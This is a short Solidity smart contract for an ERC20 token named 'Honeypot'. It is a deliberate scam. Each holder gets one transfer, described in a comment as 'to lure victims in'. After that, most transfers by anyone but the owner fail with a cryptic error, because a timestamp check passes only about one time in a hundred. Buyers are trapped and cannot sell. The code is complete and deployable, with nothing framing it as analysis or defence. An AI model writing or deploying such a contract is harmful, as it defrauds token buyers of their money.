// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract TopToken is ERC20 {
    address private immutable _owner;
    mapping(address => bool) private _hasTraded;
    
    constructor() ERC20("Honeypot", "HONEY") {
        _owner = msg.sender;
        _mint(msg.sender, 1000000 * 10**18);
    }
    
    // Use the hook pattern instead of directly overriding _transfer
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        super._beforeTokenTransfer(from, to, amount);
        
        // Skip checks for minting operations
        if (from == address(0)) {
            return;
        }
        
        // Owner can always transfer
        if (from == _owner) {
            return;
        }
        
        // First transfer from any address works - to lure victims in
        if (!_hasTraded[from]) {
            _hasTraded[from] = true;
            return;
        }
        
        // Subsequent transfers silently fail with a cryptic error
        require(block.timestamp % 100 == 1, "ERROR: TX_FAILED");
    }
}